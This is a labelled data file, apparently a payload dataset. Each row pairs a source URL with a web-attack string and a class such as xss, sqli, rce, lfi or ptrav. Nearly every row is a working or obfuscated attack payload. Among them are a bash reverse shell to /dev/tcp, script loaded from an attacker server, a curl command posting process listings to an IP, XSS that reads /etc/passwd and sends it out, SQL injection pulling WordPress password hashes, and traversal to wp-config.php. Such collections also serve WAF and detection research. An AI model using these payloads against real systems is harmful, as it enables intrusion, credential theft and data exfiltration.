https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60,"""${!#}<<<{\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}$#))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#${##}$#${##}${##}$#))\',\$\'\\$(($((${##}<<${##}))#${##}${##}$#${##}${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\',\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#$#$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#$#))\'} ${!#}<<<{\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}$#))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#${##}$#${##}${##}$#))\',\$\'\\$(($((${##}<<${##}))#${##}${##}$#${##}${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\',\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#${##}${##}$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#$#))\\$(($((${##}<<${##}))#${##}$#$#${##}${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}${##}${##}))\'}",rce
https://c0nqr0r.medium.com/error-based-sql-injection-with-waf-bypass-manual-exploit-100-bab36b769005,"’%2buser_name(convert(int,(SESSION_USER))) — ’%2buser_name(UPPER(‘sql+tutorial+is+fun!’)) — ’%2buser_name(IIF(5=4,+’YES’,+’HackedBy_c0nqr0r&0x4m’)) — ’%2buser_name(convert(int,(db_name()))) —",sqli
https://aidilarf.medium.com/cve-2023-26046-cve-2023-26047-xss-bypass-waf-at-teler-waf-678d6e646dee,"“autofocus onclick=’&#97;lert()’",xss
https://aidilarf.medium.com/cve-2023-26046-cve-2023-26047-xss-bypass-waf-at-teler-waf-678d6e646dee,"“autofocus onFocUs=’find(l\u{6F}cati\u{6F}n=`j&Tab;avascr&NewLine;ipt&colon;al&Tab;ert()`)’",xss
https://www.mend.io/vulnerability-database/CVE-2022-23073,"<img src=a onerror=""var x=document.createElement('script');x.src='<attacker_server>/api.js';document.body.appendChild(x);"">",xss
https://twitter.com/aboul3la/status/1286012324722155525,"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../",ptrav
https://twitter.com/0x0SojalSec/status/1634612342855196674,"xss'''><iframe srcdoc='%26it;script>;prompt` ${document.domain}`%26it;/script>'>",xss
https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit/blob/main/cacti.py,bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ipAddress/port%200%3E%261%27,rce
https://pentest-tools.com/blog/exploit-rce-vulnerability-laravel-cve-2021-3129,php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log,rce
https://medium.com/@mbdogrusoz/how-can-i-bypass-the-waf-7e12ccfc56f5,cat /???/??ss??,rce
https://medium.com/@mbdogrusoz/how-can-i-bypass-the-waf-7e12ccfc56f5,cat /e??/p????? ,rce
https://twitter.com/Un9nPlayer/status/1637769448172974081?cxt=HHwWgsCz5diow7otAAAA,"[""');alert('xss');//""]@xyz.xxx",xss
https://twitter.com/gonzxph/status/1629064458218921984,javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain,xss
https://twitter.com/sratarun/status/1637766648282116097,"<c/onpointerrawupdate=d=document,b=%27%60%27,d[%27loca%27%2B%27tion%27]=%27javascript%26colon;aler%27%2B%27t%27%2Bb%2Bdomain%2Bb>",xss
https://twitter.com/ghostofwhowas/status/1636925877547069440,"echo '61776b20277b7072696e742024307d27202f3f3f2a632f3f2a7764' | xxd -p -r | sh echo ""U2FsdGVkX19AYgtqPB2JND9fswlDf/i2ZWP8FUTyqHS+7EUuA2meAMm9Cd1Z67lq1+e5qEUyJmBsvFsu5yzI3aftPy8q/qjIwVo8feoh1JM="" | openssl enc -d -des3 -base64 -pass pass:bex -pbkdf2 | sh | sh",rce
https://twitter.com/rootxvishal/status/1641920769046511616,<svg/onload=location/**/='http://GH0ST.xss.ht/'+document.dom�,xss
https://twitter.com/guzfr1ng/status/1639531453393322006,autofocus ' onfocus='alert(document.domain)',xss
https://twitter.com/guzfr1ng/status/1639531453393322006,"""autofocus onfocus='alert(document.domain)' ",xss
https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922,%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE,xss
https://gitee.com/wkstestete/cve/blob/master/sql/ibos%20sql%20injection3.md,"""') AND (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- qw""",sqli
https://wpscan.com/vulnerability/a6c1676d-9dcb-45f6-833a-9545bccd0ad6,"f'1) UNION SELECT 1,{title},concat(""fa fa-"",user_pass),3,4,5,6 from wp_users%23",sqli
https://wpscan.com/vulnerability/39c964fa-6d8d-404d-ac38-72f6f88d203c,action=parse-media-shortcode&post_ID=1&shortcode=[gigpress_related_shows sort=' AND (SELECT 42 FROM (SELECT(SLEEP(2)))b),sqli
https://wpscan.com/vulnerability/b027a8db-0fd6-444d-b14a-0ae58f04f931,%3C/script%3E%3Cimg%20src%3D1%20onerror%3Dalert(/xss/),xss
https://wpscan.com/vulnerability/1b5a018d-f2d4-4373-be1e-5162cc5c928b,1%20AND%20(SELECT%209312%20FROM%20(SELECT(SLEEP(5)))hYkP,sqli
https://wpscan.com/vulnerability/025a47f0-eddc-46dd-b994-e1e824dc5225,../../../wp-config.php ,lfi
https://wpscan.com/vulnerability/221bf87b-69e2-4c53-971e-8516b798c759,111+AND+(SELECT+5926+FROM+(SELECT(SLEEP(5)))erUA) ,sqli
https://wpscan.com/vulnerability/3ec56fe0-5297-40be-89d0-282a2e9938bc,1&a%2522%253e%253cscript%253ealert%2528/xss/%2529%253c%252fscript%253e,xss
https://wpscan.com/vulnerability/6cedb27f-6140-4cba-836f-63de98e521bf,%3Cscript%3Ealert(`xss`)%3C/script%3E,xss
https://twitter.com/0SPwn/status/1651740036717576195,"""><a href=jav&#x0D;ascript&colon;top[8680439..toString(30)](document.domain)>Click</a>",xss
https://twitter.com/0x0SojalSec/status/1653830922679250944,/???/???/c?t$IFS/???/p?s?w?,ptrav
https://twitter.com/gdprAI/status/1653160069109026816,"<!DOCTYPE foo [<!ENTITY % a ""&#x3c;&#x21; ... omitted ...", xxe
https://wpscan.com/vulnerability/c5e395f8-257e-49eb-afbd-9c1e26045373,"{""sku"":""a\"" AND (SELECT 42 FROM (SELECT(SLEEP(5)))wlHd)-- pOeU""}",sqli
https://twitter.com/ShawarkOFFICIAL/status/1656050953660043265,"><BODy onbeforescriptexecute=""x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c"">",xss
https://medium.com/@lopseg/bug-bounty-writeup-stored-xss-vulnerability-waf-bypass-f38aae7ff9eb,"<a href=""http://example.com;"" onmouseover=""z=top;z[/al/.source%2b/ert/.source](8);//test.com/""",xss
https://twitter.com/ClumsyLulz/status/1659625523943751702,<svg>on%20onload%3D(“XSS”)(document.domain)<%2Fsvg>,xss
https://medium.com/@cyberninja717/reflected-cross-site-scripting-vulnerability-in-ellucian-ethos-identity-cas-logout-page-685bb1675dfb,http://example.com%22%3E%3Csvg%3E%3Cimage%20xlink:href=%22path/to/image.jpg%22%20onerror=confirm(document.location)%3E,xss
https://twitter.com/tohasec/status/1164291647624097797,<img src onerror=%26emsp;prompt`${document.domain}`>,xss
https://medium.com/@alb-soul/xss-with-403-waf-bypass-for-and-document-cookie-998850c02bd5,"testtest”+onmouseover%3D”alert%26%230000000040%3Bdocument[‘cookie’])",xss
https://github.com/Mr-xn/CVE-2022-24086,"{{var this.getTemplateFilter().addAfterFilterCallback(""system"").filter(""whoami"")}}",rce
https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/,"SELECT * FROM test WHERE id = 1 WAITFOR DELAY'0:0:5'",sqli
https://twitter.com/0x0SojalSec/status/1674130690785398796,"////evil%E3%80%82com",redir
https://twitter.com/_Y000_/status/1676088313839583232/photo/2,"-16'and@:=",sqli
https://twitter.com/SaltinDeadsec/status/1679237884312690689,"""><svg%20onload=alert%26%230000000040""1"")>",xss
https://packetstormsecurity.com/files/173143/Office-Suite-Premium-10.9.1.42602-Cross-Site-Scripting.html,dfsse%3cimg%20src%3da%20onerror%3dalert(1)%3ez1668cyj2pi,xss
https://medium.com/@youghourtaghannei/cloudflare-bypass-and-exploit-your-xss-e720b7333305,"javas%09cript:ghi=%27)%3E%27,you=%27(top%5B%22docum%22%2B%22ent%22%5D.cookie%27;HTMLElement%5B%27inne%27%2B%27rHTML%27%5D=%27%3CSvg/OnLoad=alert%27%2Brob%2Beco;//",xss
https://vulners.com/github/GHSA-8FV7-WQ38-F5C9?utm_source=rss&utm_medium=rss&utm_campaign=rss,&lt;script&gt;,xss
https://www.youtube.com/watch?v=LZqTeVuaIL4,"null /*!12345union*/ select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",sqli
https://twitter.com/Cyber_Berkkut/status/1691944550200119713,"""&gt;&lt;Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ==""))&gt;",xss
https://fares7elsadek.medium.com/my-first-bug-how-i-was-able-to-bypass-the-waf-and-uncover-a-reflected-xss-e0534b6f05e4,"<=script>=alert(""hacked"")<=/scirpt>=",xss
https://vulners.com/github/GHSA-8XHR-X3V8-RGHJ?utm_source=rss&utm_medium=rss&utm_campaign=rss,"services.logging.getLogger(""foo"").error(""Job content executed"")",rce
https://vulners.com/cve/CVE-2023-41044?utm_source=rss&utm_medium=rss&utm_campaign=rss,/api/system/debug/support/bundle/download/{filename},lfi
https://t.me/ZerodayExploitware/2233,<SvG><set%0Aonbegin%0A=%0aa=confirm;a%28%60xss%60)/x>,xss
https://vulners.com/cve/CVE-2023-31719?utm_source=rss&utm_medium=rss&utm_campaign=rss,%7B%22name%22%3A%22test.php%22%2C%22data%22%3A%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs%2FPljAc143k%2FyPi9t%2BX9N9qif38ePJv1%2FvBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII%3D%22%7D,sqli
https://twitter.com/jacky_ichwan/status/1721054490017886381,javascript%3Avar%20a%3D%22ale%22%3Bvar%20b%3D%22rt%22%3Bvar%20c%3D%22%28%29%22%3BdecodeURI%28%22%26lt%3Bbutton%20popovertarget%3Dx%26gt%3BClick%20me%26lt%3B%2Fbutton%26gt%3B%26lt%3Bhvita%20onbeforetoggle%3D%22%2Ba%2Bb%2Bc%2B%22%20popover%20id%3Dx%26gt%3BHvita%26lt%3B%2Fhvita%26gt%3B%22%29,xss
https://www.linkedin.com/pulse/yamcs-vulnerability-assessment-visionspace-technologies/,../../../../../../../../home/kali/work/assessments/yamcs/examples/simulation/target/yamcs/etc/users.yaml,lfi
https://github.com/crater-invoice/crater/issues/1267,%7B%22name%22%3A%22test.php%22%2C%22data%22%3A%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs%2FPljAc143k%2FyPi9t%2BX9N9qif38ePJv1%2FvBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII%3D%22%7D,rce
https://twitter.com/g1nk00/status/1735407588529913969,&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;,xss
https://twitter.com/TheMsterDoctor1/status/1743187595163501005,&lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt%2Ca(origin)%20x&gt;,xss
https://vulners.com/github/GHSA-H374-MM57-879C?utm_source=rss&utm_medium=rss&utm_campaign=rss,(CASE+WHEN+(SELECT+1)=1+THEN+id+ELSE+updated_at+END)+ASC+,sqli
https://vulners.com/cve/CVE-2023-50094?utm_source=rss&utm_medium=rss&utm_campaign=rss,curl%2520-X%2520POST%2520--data%2520%22%24%28ps%2520-aux%29%22%2520192.168.1.91%2F%3F%60id%60,rce
https://twitter.com/g1nk00/status/1735407588529913969,"&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;",xss
https://twitter.com/TheMsterDoctor1/status/1743187595163501005,"&lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x&gt;",xss
https://vulners.com/github/GHSA-GP6M-FQ6H-CJCX?utm_source=rss&utm_medium=rss&utm_campaign=rss,"&lt;img src=x onerror=alert(1)&gt;.crt",xss
https://vulners.com/cve/CVE-2024-1923?utm_source=rss&utm_medium=rss&utm_campaign=rss," 1337&#x27;+or+1=1;--+",sqli
https://vulners.com/github/GHSA-PGPJ-V85Q-H5FM?utm_source=rss&utm_medium=rss&utm_campaign=rss,%26lt%3Bhtml%26gt%3B%20%26lt%3Bbody%26gt%3B%20%26lt%3Bform%20action%3D%22http%3A%2F%2Flocalhost%3A8000%2Fapi%2Fadd_user%2F%2522hacker%2522%2C%2522hacker%2522%22%26gt%3B%20%26lt%3Binput%20type%3D%22submit%22%20value%3D%22Submit%20request%22%20%2F%26gt%3B%20%26lt%3B%2Fform%26gt%3B%20%26lt%3Bscript%26gt%3B%20history.pushState%28%27%27%2C%20%27%27%2C%20%27%2F%27%29%3B%20document.forms%5B0%5D.submit%28%29%3B%20%26lt%3B%2Fscript%26gt%3B%20%26lt%3B%2Fbody%26gt%3B%20%26lt%3B%2Fhtml%26gt%3B,xss
https://twitter.com/RootMoksha/status/1770379210705838114,&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt,xss
https://vulners.com/githubexploit/8292EFB2-7D48-5269-85E0-90F582B0CF95?utm_source=rss&utm_medium=rss&utm_campaign=rss,SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}'))={i} THEN sleep(3) ELSE sleep(0) END,sqli
https://vulners.com/githubexploit/8292EFB2-7D48-5269-85E0-90F582B0CF95?utm_source=rss&utm_medium=rss&utm_campaign=rss,SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}' and table_name = '{where2}'))={i} THEN sleep(3) ELSE sleep(0) END,sqli
https://vulners.com/githubexploit/7A6411F4-C896-52AB-9725-D10DEBF9CD0F?utm_source=rss&utm_medium=rss&utm_campaign=rss,clicks%60%3DIF%28SUBSTRING%28version%28%29%2C1%2C1%29%3D5%2CSLEEP%2810%29%2Cnull%29--%20-,sqli
https://twitter.com/TakSec/status/1786074467728515132, 1%27%22%26gt%3B%26lt%3BA%20HRef%3D%5C%22%20AutoFocus%20OnFocus%3Dtop%2F%2A%2A%2F%3F.%5B%27ale%27%252B%27rt%27%5D%281%29%26gt%3B,xss
https://twitter.com/KN0X55/status/1786022967933046971,%20%3CA%20HRef%3D%5C%22%20AutoFocus%20OnFocus%3Dtop%2F%2A%2A%2F%3F.%5B%27al%27%252B%27ert%27%5D%281%29%3E,xss
https://twitter.com/PrinceOker79109/status/1786548416010498123, %3CImg%20Src%3DOnXSS%20OnError%3Dconfirm%28%22Hacked_by_a7madn1%22%29%3E,xss
https://twitter.com/XssPayloads/status/1788748656390058340, %26lt%3Bfoo%2520bar%3D%25250a%2520onclick%3D%26lt%3Byour%20js%20code%26gt,xss
https://twitter.com/Dharamveer_____/status/1788492033675440375, %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E,xss
https://twitter.com/Dharamveer_____/status/1788492033675440375,%20%60%22%2F%2F%3E%3Cscript%3Ealert%28%29%3C%2Fscript%3E,xss
https://twitter.com/its_Loksh_P/status/1792006779783848407, alert%20%3D%20window%5B%22al%22%2B%22ert%22%5D,xss
https://twitter.com/Sharo_k_h/status/1792235995154514276,%20%3Cdetails%20x%3Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3A2%20open%20ontoggle%3D%26%23x0000000000061%3Blert%26%23x000000028%3Borigin%26%23x000029%3B%3E,xss
https://twitter.com/0xRAYAN7/status/1793217107544424474,%20%3Csvg%20onload%3Dalert%26%230000000040document.cookie%3E%20%3Csvg%2FoNLY%3D1%2F%2A%2A%2FOn%2BONLoaD%3Dco%5Cu006efirm%26%5C%23x28%3B%5C%23x29%3B%3E,xss
https://twitter.com/0xRAYAN7/status/1793217107544424474,%20%26lt%3Bsvg%2FoNLY%253d1%2F%2A%2A%2FOn%2BONLoaD%253dco%5Cu006efirm%2526%2523x28%253b%2526%2523x29%253b%26gt%3B,xss
https://twitter.com/0xRAYAN7/status/1793217107544424474,%20%26lt%3BSvg%20Only%3D1%20OnLoad%3Dconfirm%28atob%28%22Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ%3D%3D%22%29%29%26gt%3B,xss
https://vulners.com/githubexploit/C99986A2-7B57-5939-9BD1-AA95A6572AF3?utm_source=rss&utm_medium=rss&utm_campaign=rss, ;echo 1337; die;,xss
https://twitter.com/t0t3kingpad4/status/1800833416491049416,%20%22%2F%26gt%3B%26lt%3B%E2%80%8B%2Fscript%26gt%3B%26lt%3B%E2%80%8Bscript%26gt%3Balert%28document.domain%29%26lt%3B%E2%80%8B%2Fscript%26gt%3B,xss
https://twitter.com/cyber_advising/status/1804119011086549017,%20%3Cscript%3Efetch%28%27%2Fjson_api.php%3Fquery%5B%5D%3D..%2Fetc%2Fpasswd%27%29.then%28r%20%3D%3E%20r.text%28%29%29.then%28t%20%3D%3E%20fetch%28%27%2Fjson_api.php%3Fquery%5B%5D%3D..%2Frspamd_custom_maps%2F%27%2Bbtoa%28t%29%29%29%3C%2Fscript%3E,xss
https://twitter.com/RootMoksha/status/1804523003235225830,%20%3Cdetails%20x%3Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3A2%20open%20ontoggle%3D%22prompt%28document.cookie%29%3B%22%3E,xss
https://twitter.com/RootMoksha/status/1804523003235225830,%20%3Csvg%2Fonload%3Dalert%2F%2A1337%2A%2F%281%29%3E,xss
https://twitter.com/RootMoksha/status/1804523003235225830,%20%26lt%3Bsvg%2Fonload%3Dalert%2F%2F%26amp%3BNewLine%3B%282%29%26gt%3B,xss
https://twitter.com/RootMoksha/status/1804523003235225830,%20%26lt%3Bsvg%2Fonload%3Dalert%26amp%3Bsol%3B%2A%2A%26amp%3Bsol%3B%283%29%26gt%3B,xss
https://twitter.com/RootMoksha/status/1804523003235225830,%20%26lt%3Bsvg%2Fonload%3Dalert%2F%26amp%3B%2342%3B%26amp%3B%2342%3B%2F%284%29%26gt%3B,xss
https://twitter.com/RootMoksha/status/1804523003235225830,%20%26lt%3Bsvg%2Fonload%3Dalert%26amp%3B%23x2F%3B%2A%2A%26amp%3B%2347%3B%285%29%26gt%3B,xss
https://twitter.com/XssPayloads/status/1805805676662255918,%20%3Cimg%20hrEF%3D%22x%22%20sRC%3D%22data%3Ax%22%20oNLy%3D1%20oNErrOR%3Dprompt%601%60%3E,xss
